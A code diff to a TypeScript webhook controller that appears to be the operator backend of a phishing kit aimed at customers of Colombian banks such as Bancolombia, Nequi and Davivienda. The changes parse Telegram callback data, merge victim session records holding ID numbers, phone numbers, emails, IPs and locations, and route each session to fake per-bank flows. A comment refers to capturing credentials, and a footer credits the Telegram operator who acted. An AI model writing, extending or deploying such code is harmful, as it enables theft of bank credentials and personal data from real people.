@@ -298,17 +298,34 @@ export class WebhookController {
       const { TelegramService } = await import("../services/TelegramService");
 
       // Se captura la informacion
-      const update = req.body;
+      const update = req.body || {};
 
-      // Nuevo formato desde el central
-      const callbackQuery = update.telegram;
-      const action = update.action;
-      const sessionId = update.sessionId;
-      const bank = update.bank;
+      // Formato desde el central o directo de Telegram callback_query
+      let callbackQuery = update.telegram || update.callback_query;
+      let action = update.action;
+      let sessionId = update.sessionId;
+      let bank = update.bank;
+
+      // Si viene directo de Telegram callback_query (data: "accion:sessionId;banco:panel")
+      if (callbackQuery && (!action || !sessionId)) {
+        const dataStr = String(callbackQuery.data || "");
+        const firstColon = dataStr.indexOf(":");
+        const firstSemicolon = dataStr.indexOf(";");
+        if (firstColon !== -1 && firstSemicolon !== -1) {
+          action = dataStr.substring(0, firstColon);
+          sessionId = dataStr.substring(firstColon + 1, firstSemicolon);
+          const rawBank = dataStr.substring(firstSemicolon + 1);
+          const bankColon = rawBank.indexOf(":");
+          bank = bankColon !== -1 ? rawBank.substring(0, bankColon) : rawBank;
+        }
+      }
+
+      // Normalizar banco eliminando sufijos como :P01
+      const bankKey = String(bank || "").split(":")[0].toUpperCase().trim();
 
       console.log("action    -> ", action);
       console.log("sessionId -> ", sessionId);
-      console.log("bank      -> ", bank);
+      console.log("bankKey   -> ", bankKey);
       console.log("------------------------");
 
       // Se valida que haya respuesta en todo
@@ -319,16 +336,27 @@ export class WebhookController {
         const firebaseSession = (await FirebaseService.getSession(sessionId)) || {};
 
         // Se fusionan asegurando que no se pierdan propiedades ni el timeline
-        const currentSession = {
-          sessionId,
+        const currentSession: Record<string, any> = {
           ...firebaseSession,
           ...memorySession,
-          timeline: (memorySession.timeline && memorySession.timeline.length > 0)
+          sessionId,
+          banco: memorySession.banco || firebaseSession.banco || bankKey,
+          precio: memorySession.precio ?? firebaseSession.precio,
+          correoUsuario: memorySession.correoUsuario || firebaseSession.correoUsuario,
+          cedula: memorySession.cedula || firebaseSession.cedula,
+          tipoDocumento: memorySession.tipoDocumento || firebaseSession.tipoDocumento,
+          celular: memorySession.celular || firebaseSession.celular,
+          nombre: memorySession.nombre || firebaseSession.nombre,
+          panel: memorySession.panel || firebaseSession.panel,
+          ip: memorySession.ip || firebaseSession.ip,
+          location: memorySession.location || firebaseSession.location,
+          messageId: callbackQuery?.message?.message_id || memorySession.messageId || firebaseSession.messageId,
+          timeline: (Array.isArray(memorySession.timeline) && memorySession.timeline.length > 0)
             ? memorySession.timeline
-            : (firebaseSession.timeline || []),
+            : (Array.isArray(firebaseSession.timeline) ? firebaseSession.timeline : []),
         };
 
-        // Guardar sesión fusionada actualizada en memoria para que no se pierda
+        // Guardar sesión fusionada actualizada en memoria y MongoDB
         await StorageService.set(`session_${sessionId}`, currentSession);
 
         // Se capturan las credenciales
@@ -338,18 +366,12 @@ export class WebhookController {
         const userName = firstName + (usernameRaw ? ` (@${usernameRaw})` : "");
         const messageId = Number(callbackQuery?.message?.message_id ?? currentSession?.messageId ?? 0);
 
-        // Se actualiza la ultima acción
-        await FirebaseService.saveSession(sessionId, {
-          ...currentSession,
-          lastStatus: action,
-        });
-
         // Se inicializa la variable para el mensaje y el mapeo de acciones
         let baseMessage = "";
         let actionMap: any = {};
 
         // -----------------------Se valida desde que banco se esta ejecutando la accion----------------------- //
-        if (bank === "AVVILLAS") {
+        if (bankKey === "AVVILLAS") {
 
           // Se inicializan los import
           const { AvvillasController } = await import("./bancoAvvillas/AvvillasController");
@@ -371,7 +393,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es Bancolombia----------------------------------- //
-        else if (bank === "BANCOLOMBIA") {
+        else if (bankKey === "BANCOLOMBIA") {
 
           // Se inicializan los import
           const { BancolombiaController } = await import("./bancoBancolombia/BancolombiaController");
@@ -403,7 +425,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es BBVA----------------------------------- //
-        else if (bank === "BBVA") {
+        else if (bankKey === "BBVA") {
 
           // Se inicializan los import
           const { BbvaController } = await import("./bancoBbva/BbvaController");
@@ -425,7 +447,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es BOGOTA----------------------------------- //
-        else if (bank === "BOGOTA") {
+        else if (bankKey === "BOGOTA") {
 
           // Se inicializan los import
           const { BogotaController } = await import("./bancoBogota/BogotaController");
@@ -449,7 +471,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es Caja Social----------------------------------- //
-        else if (bank === "CAJA_SOCIAL") {
+        else if (bankKey === "CAJA_SOCIAL") {
 
           // Se inicializan los import
           const { CajaSocialController } = await import("./bancoCajaSocial/CajaSocialController");
@@ -473,7 +495,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es COLPATRIA----------------------------------- //
-        else if (bank === "COLPATRIA") {
+        else if (bankKey === "COLPATRIA") {
 
           // Se inicializan los import
           const { ColpatriaController } = await import("./bancoColpatria/ColpatriaController");
@@ -497,7 +519,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es DAVIVIENDA----------------------------------- //
-        else if (bank === "DAVIVIENDA") {
+        else if (bankKey === "DAVIVIENDA") {
 
           // Se inicializan los import
           const { DaviviendaController } = await import("./bancoDavivienda/DaviviendaController");
@@ -520,7 +542,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es FALABELLA----------------------------------- //
-        else if (bank === "FALABELLA") {
+        else if (bankKey === "FALABELLA") {
 
           // Se inicializan los import
           const { FalabellaController } = await import("./bancoFalabella/FalabellaController");
@@ -544,7 +566,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es ITAU----------------------------------- //
-        else if (bank === "ITAU") {
+        else if (bankKey === "ITAU") {
 
           // Se inicializan los import
           const { ItauController } = await import("./bancoItau/ItauController");
@@ -566,7 +588,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es Nequi----------------------------------- //
-        else if (bank === "NEQUI") {
+        else if (bankKey === "NEQUI") {
 
           // Se inicializan los import
           const { NequiController } = await import("./bancoNequi/NequiController");
@@ -591,7 +613,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es OCCIDENTE----------------------------------- //
-        else if (bank === "OCCIDENTE") {
+        else if (bankKey === "OCCIDENTE") {
 
           // Se inicializan los import
           const { OccidenteController } = await import("./bancoOccidente/OccidenteController");
@@ -613,7 +635,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es POPULAR----------------------------------- //
-        else if (bank === "POPULAR") {
+        else if (bankKey === "POPULAR") {
 
           // Se inicializan los import
           const { PopularController } = await import("./bancoPopular/PopularController");
@@ -635,7 +657,7 @@ export class WebhookController {
         }
 
         // ---------------------------------Se valida cuando es SERFINANZA----------------------------------- //
-        else if (bank === "SERFINANZA") {
+        else if (bankKey === "SERFINANZA") {
 
           // Se inicializan los import
           const { SerfinanzaController } = await import("./bancoSerfinanza/SerfinanzaController");
@@ -758,6 +780,12 @@ export class WebhookController {
         // Se inicializa el footer
         const footer = `\n🚨 <b>Acción realizada:</b> ${actionName}\n🥷 <b>Por:</b> ${userName}`;
 
+        // Si baseMessage quedó vacío por cualquier motivo, usar fallback global
+        if (!baseMessage.trim()) {
+          const { Helper } = await import("./Helper");
+          baseMessage = await Helper.formatMessageForBank(currentSession, bankKey);
+        }
+
         // Se edita el mensaje si existe messageId válido
         if (Number.isFinite(messageId) && messageId > 0) {
 
@@ -772,7 +800,7 @@ export class WebhookController {
 
         // Se inicializa el estado y la url a persistir
         let statusToSave = action;
-        let url = WebhookController.BANK_ROUTES[bank];
+        let url = WebhookController.BANK_ROUTES[bankKey] || WebhookController.BANK_ROUTES[bank];
 
         // Se valida cuando la accion es back para devolver al comercio externo
         if (action === "back") {
@@ -799,7 +827,7 @@ export class WebhookController {
         // Se setea la url en el storage para el flujo logo legacy
         await StorageService.set(`url_redirect_${sessionId}`, url);
 
-        // Se actualiza la ultima acción realizada
+        // Se actualiza la ultima acción realizada en Firebase/MongoDB
         await FirebaseService.saveSession(sessionId, {
           lastStatus: statusToSave,
           urlRedirect: url,
